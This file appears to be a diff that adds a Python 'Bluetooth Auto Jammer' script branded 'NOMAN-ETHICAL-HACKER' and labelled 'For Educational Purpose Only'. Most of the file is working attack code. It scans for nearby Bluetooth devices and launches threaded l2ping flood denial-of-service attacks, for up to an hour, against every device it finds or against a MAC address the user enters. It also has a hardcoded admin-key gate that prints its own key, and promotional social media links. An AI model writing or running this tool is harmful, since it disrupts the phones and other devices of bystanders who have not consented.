@@ -1,0 +1,293 @@
+import subprocess
+import threading
+import time
+import os
+import re
+import sys
+
+# Colour codes (terminal must support ANSI)
+CYAN = "\033[96m"
+BLUE = "\033[94m"
+GREEN = "\033[92m"
+RED = "\033[91m"
+YELLOW = "\033[93m"
+RESET = "\033[0m"
+
+# Admin credentials
+ADMIN_KEY = "NOMAN1"
+ADMIN_SOCIAL_MEDIA = {
+    "Facebook": "https://www.facebook.com/md.norman.988",
+    "WhatsApp Group": "https://chat.whatsapp.com/L0Y71TSqNd55sFkwpIOMyH",
+    "WhatsApp Channel": "https://whatsapp.com/channel/0029VbAkW0SATRSeAAYjNv1Z",
+    "YouTube": "https://youtube.com/@FirewallBreaker"
+}
+
+def authenticate_admin():
+    """Require admin key authentication to proceed"""
+    display_banner()
+    
+    print(f"{RED}{'='*60}{RESET}")
+    print(f"{YELLOW}           ADMIN AUTHENTICATION REQUIRED{RESET}".center(70))
+    print(f"{RED}{'='*60}{RESET}")
+    
+    # Show admin information first
+    terminal_width = 60
+    print(f"\n{CYAN}{'='*terminal_width}{RESET}")
+    print(f"{GREEN}           ADMIN INFORMATION{RESET}".center(terminal_width + 9))
+    print(f"{CYAN}{'='*terminal_width}{RESET}")
+    print(f"{YELLOW}Admin Key: {ADMIN_KEY}{RESET}".center(terminal_width + 12))
+    print(f"{BLUE}Social Media Links:{RESET}".center(terminal_width + 19))
+    for platform, link in ADMIN_SOCIAL_MEDIA.items():
+        print(f"  {GREEN}{platform}: {CYAN}{link}{RESET}")
+    print(f"{CYAN}{'='*terminal_width}{RESET}")
+    
+    # Authentication attempt counter
+    attempts = 3
+    
+    while attempts > 0:
+        print(f"\n{YELLOW}[*] Attempts remaining: {attempts}{RESET}")
+        user_key = input(f"{CYAN}[?] Enter Admin Key to continue: {RESET}").strip()
+        
+        if user_key == ADMIN_KEY:
+            print(f"\n{GREEN}[✓] Authentication successful! Starting tool...{RESET}")
+            time.sleep(2)
+            return True
+        else:
+            attempts -= 1
+            if attempts > 0:
+                print(f"{RED}[!] Invalid admin key! {attempts} attempts remaining.{RESET}")
+            else:
+                print(f"{RED}[!] Maximum attempts exceeded! Tool locked.{RESET}")
+                print(f"{YELLOW}[*] Contact admin for access.{RESET}")
+                sys.exit(1)
+    
+    return False
+
+# Banner
+def display_banner():
+    """
+    Displays the main banner with 'NOMAN' only.
+    """
+    if 'win' in sys.platform:
+        os.system('cls')
+    else:
+        os.system('clear')
+
+    print("""\033[1;32m
+ _   _  ____  __  __    _    _   _  
+| \ | |/ __ \|  \/  |  / \  | \ | | 
+|  \| | |  | | \  / | / _ \ |  \| | 
+| . ` | |  | | |\/| |/ ___ \| . ` |
+|_|\_| \____/|_|  |_/_/   \_\_|\_|
+                         
+                    NOMAN-ETHICAL-HACKER
+\033[0m""")
+
+# Centered credits
+CREDITS = [
+    "Created by Thakur2309 | YouTube: Firewall Breaker",
+    "Official channel for tutorials & demos",
+    "For Educational Purpose Only"
+]
+
+ATTACK_THREADS = []
+
+def check_bluetooth_tools():
+    """Check if required Bluetooth tools are installed."""
+    required_tools = ['hciconfig', 'hcitool', 'l2ping']
+    missing_tools = []
+    
+    for tool in required_tools:
+        try:
+            subprocess.run(f"which {tool}", shell=True, check=True, 
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except subprocess.CalledProcessError:
+            missing_tools.append(tool)
+    
+    return missing_tools
+
+def install_bluetooth_tools():
+    """Guide user to install Bluetooth tools."""
+    print(f"\n{RED}[!] Required Bluetooth tools are missing!{RESET}")
+    print(f"{YELLOW}[*] To install Bluetooth tools:{RESET}")
+    print(f"{CYAN}For Termux (Android):{RESET}")
+    print(f"{GREEN}pkg update && pkg install bluez-tools{RESET}")
+    print(f"\n{CYAN}For Linux (Debian/Ubuntu):{RESET}")
+    print(f"{GREEN}sudo apt update && sudo apt install bluez bluez-tools{RESET}")
+    print(f"\n{CYAN}For Linux (Arch):{RESET}")
+    print(f"{GREEN}sudo pacman -S bluez bluez-utils{RESET}")
+    print(f"\n{YELLOW}After installation, restart this script.{RESET}")
+
+def validate_mac(mac):
+    """Validate Bluetooth MAC address format (XX:XX:XX:XX:XX:XX)."""
+    pattern = r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$'
+    return bool(re.match(pattern, mac))
+
+def ensure_hci0_up():
+    """Ensure hci0 is up and running."""
+    try:
+        result = subprocess.check_output("hciconfig", shell=True, timeout=2, 
+                                       stderr=subprocess.DEVNULL).decode()
+        if "hci0" in result and "DOWN" in result:
+            print(f"{BLUE}[*] Bringing hci0 up...{RESET}")
+            subprocess.run("sudo hciconfig hci0 up", shell=True, timeout=2, 
+                         stderr=subprocess.DEVNULL)
+            time.sleep(1)
+            result = subprocess.check_output("hciconfig", shell=True, timeout=2,
+                                           stderr=subprocess.DEVNULL).decode()
+            if "DOWN" in result:
+                print(f"{RED}[!] Failed to bring hci0 up. Check Bluetooth adapter.{RESET}")
+                return False
+        elif "hci0" not in result:
+            print(f"{RED}[!] No hci0 device found. Check Bluetooth adapter.{RESET}")
+            return False
+        return True
+    except subprocess.CalledProcessError:
+        print(f"{RED}[!] Bluetooth tools not available. Please install them first.{RESET}")
+        return False
+    except Exception as e:
+        print(f"{RED}[!] Error ensuring hci0 up: {e}{RESET}")
+        return False
+
+def scan_devices():
+    """Scan for nearby Bluetooth devices using hcitool."""
+    if not ensure_hci0_up():
+        return []
+    print(f"{BLUE}[*] Scanning for Bluetooth devices...{RESET}")
+    try:
+        result = subprocess.check_output("hcitool scan", shell=True, timeout=30,
+                                       stderr=subprocess.DEVNULL).decode()
+        devices = []
+        for line in result.splitlines()[1:]:
+            parts = line.strip().split("\t")
+            if len(parts) == 2:
+                addr, name = parts
+                if validate_mac(addr.strip()):
+                    devices.append((addr.strip(), name.strip()))
+        return devices
+    except subprocess.TimeoutExpired:
+        print(f"{RED}[!] Scan timed out after 30 seconds.{RESET}")
+        return []
+    except subprocess.CalledProcessError:
+        print(f"{RED}[!] Scan failed. Make sure Bluetooth is enabled and tools are installed.{RESET}")
+        return []
+    except Exception as e:
+        print(f"{RED}[!] Scan failed: {e}{RESET}")
+        return []
+
+def attack_device(mac, name):
+    """Perform l2ping flood attack on a Bluetooth device."""
+    if not ensure_hci0_up():
+        return
+    print(f"{GREEN}[+] Attacking {name} ({mac}) with l2ping flood...{RESET}")
+    try:
+        subprocess.run(f"l2ping -i hci0 -s 600 -f {mac}", shell=True, timeout=60, 
+                     check=True, stderr=subprocess.DEVNULL)
+    except subprocess.TimeoutExpired:
+        print(f"{RED}[!] Attack on {mac} timed out after 60 seconds.{RESET}")
+    except KeyboardInterrupt:
+        print(f"{RED}[-] Attack on {mac} stopped by user.{RESET}")
+    except subprocess.CalledProcessError:
+        print(f"{RED}[!] Error: l2ping command failed. Check permissions and Bluetooth status.{RESET}")
+    except Exception as e:
+        print(f"{RED}[!] Error attacking {mac}: {e}{RESET}")
+
+def start_attack(devices):
+    """Start attack threads for all discovered devices."""
+    for addr, name in devices:
+        t = threading.Thread(target=attack_device, args=(addr, name))
+        t.daemon = True
+        t.start()
+        ATTACK_THREADS.append(t)
+        time.sleep(0.5)  # Prevent system overload
+
+def attack_single_device():
+    """Attack a single device specified by user."""
+    target_mac = input(f"{YELLOW}[*] Enter the MAC address to attack (XX:XX:XX:XX:XX:XX): {RESET}").strip()
+    target_name = input(f"{YELLOW}[*] Enter the name of the target device: {RESET}").strip()
+   
+    if validate_mac(target_mac) and target_name:
+        print(f"\n{GREEN}[*] Starting DoS attack on {target_name} ({target_mac})...{RESET}\n")
+        attack_device(target_mac, target_name)
+    else:
+        print(f"{RED}[!] Invalid MAC address or name. Exiting...{RESET}")
+
+def show_admin_info():
+    """Display admin information and social media links."""
+    terminal_width = 60
+    print(f"\n{CYAN}{'='*terminal_width}{RESET}")
+    print(f"{GREEN}           ADMIN INFORMATION{RESET}".center(terminal_width + 9))
+    print(f"{CYAN}{'='*terminal_width}{RESET}")
+    print(f"{YELLOW}Admin Key: {ADMIN_KEY}{RESET}".center(terminal_width + 12))
+    print(f"{BLUE}Social Media Links:{RESET}".center(terminal_width + 19))
+    for platform, link in ADMIN_SOCIAL_MEDIA.items():
+        print(f"  {GREEN}{platform}: {CYAN}{link}{RESET}")
+    print(f"{CYAN}{'='*terminal_width}{RESET}\n")
+
+def main():
+    """Main function to run the Bluetooth Auto Jammer."""
+    # First authenticate user
+    if not authenticate_admin():
+        return
+    
+    # Clear screen and show main interface after authentication
+    display_banner()
+    
+    # Display credits
+    terminal_width = 60
+    print(f"\n{YELLOW}{'='*terminal_width}{RESET}")
+    for line in CREDITS:
+        print(f"{CYAN}{line.center(terminal_width)}{RESET}")
+    print(f"{YELLOW}{'='*terminal_width}{RESET}")
+    
+    # Check for required tools
+    missing_tools = check_bluetooth_tools()
+    if missing_tools:
+        print(f"{RED}[!] Missing tools: {', '.join(missing_tools)}{RESET}")
+        install_bluetooth_tools()
+        return
+    
+    # Show admin information
+    show_admin_info()
+    
+    # Check if device has Bluetooth capability
+    try:
+        subprocess.run("hciconfig", shell=True, check=True, 
+                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except subprocess.CalledProcessError:
+        print(f"{RED}[!] No Bluetooth adapter found or hciconfig not working.{RESET}")
+        print(f"{YELLOW}[*] Make sure:{RESET}")
+        print(f"{CYAN}1. Your device has Bluetooth capability{RESET}")
+        print(f"{CYAN}2. Bluetooth is enabled{RESET}")
+        print(f"{CYAN}3. Required tools are installed{RESET}")
+        return
+    
+    devices = scan_devices()
+    if not devices:
+        print(f"{RED}[!] No Bluetooth devices found.{RESET}")
+        print(f"{YELLOW}[*] Tips:{RESET}")
+        print(f"{CYAN}- Make sure Bluetooth is enabled on both devices{RESET}")
+        print(f"{CYAN}- Devices need to be in discoverable mode{RESET}")
+        print(f"{CYAN}- Try moving closer to target devices{RESET}")
+        return
+        
+    print(f"\n{YELLOW}Devices found:{RESET}")
+    for i, (addr, name) in enumerate(devices):
+        print(f"{YELLOW}{i+1}. {name} - {addr}{RESET}")
+        
+    confirm = input(f"\n{YELLOW}Start DoS attack on ALL devices? (y/n): {RESET}").strip().lower()
+    if confirm == 'y':
+        try:
+            start_attack(devices)
+            print(f"\n{GREEN}[*] Attacking all devices. Press CTRL+C to stop.{RESET}\n")
+            time.sleep(3600)  # Run for max 1 hour
+        except KeyboardInterrupt:
+            print(f"\n{RED}[!] Stopped by user.{RESET}")
+    elif confirm == 'n':
+        print(f"{BLUE}[*] Switching to single device attack.{RESET}")
+        attack_single_device()
+    else:
+        print(f"{RED}[!] Invalid input. Exiting...{RESET}")
+
+if __name__ == "__main__":
+    main()
